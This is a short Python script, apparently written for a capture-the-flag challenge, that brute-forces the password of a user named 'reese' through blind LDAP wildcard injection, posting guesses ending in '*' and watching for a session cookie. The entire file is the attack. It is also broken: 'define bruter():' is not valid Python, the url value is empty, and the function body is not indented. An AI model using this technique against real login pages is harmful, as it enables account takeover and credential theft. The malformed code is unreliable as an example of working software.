import requests 
import string
# letters = list(string.ascii_lowercase)
# letters.extend([i.upper() for i in letters])
# letters = string.printable   THis included everything but * was throwing off my wildcard ldap 
letters = string.printable + string.digits + "!@#$%^&()_-+{}[]~`|\/?><.,:'="
url =   # 167.91.91.91:30811
itteration = ""


define bruter():
truthtable = "" 
should_retry = True 
while should_retry: 
    print("while restrat") 
    should_retry = False 
    for letter in letters: 
        itteration = truthtable 
        print(f"itteration is {itteration}") 
        itteration += letter + "*" 
        parms = {'username':'reese','password':itteration} 
        x = requests.Session() 
        x.post(url, data = parms) 
        print(parms) 
        print(itteration) 
        print(x.cookies.items()) 
        if x.cookies.get('mysession'): 
            print(' YESYESYESYESYESYESYESYSE'*2) 
            truthtable += letter 
            print('The truthtable is: ', truthtable) 
            should_retry = True 
            break  
bruter()
  
